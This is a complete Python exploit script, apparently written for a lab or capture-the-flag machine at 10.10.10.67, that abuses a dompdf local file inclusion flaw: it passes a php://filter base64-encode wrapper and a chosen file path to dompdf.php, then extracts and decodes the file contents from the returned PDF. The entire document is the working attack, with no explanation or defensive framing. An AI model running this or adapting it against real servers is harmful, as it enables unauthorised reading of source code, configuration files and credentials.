#!/usr/bin/env python3
import base64
import urllib.request
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()


url = 'http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource='

try:
	req = urllib.request.urlopen(url + args.file)

	output = req.read()
	
	if output:
		string = output.decode()
		result = string[string.find("[(")+2:string.find(")]")]
		decoded = base64.b64decode(result).decode('utf8')
		print(decoded)

except urllib.error.HTTPError:
	print("File cannot be downloaded")
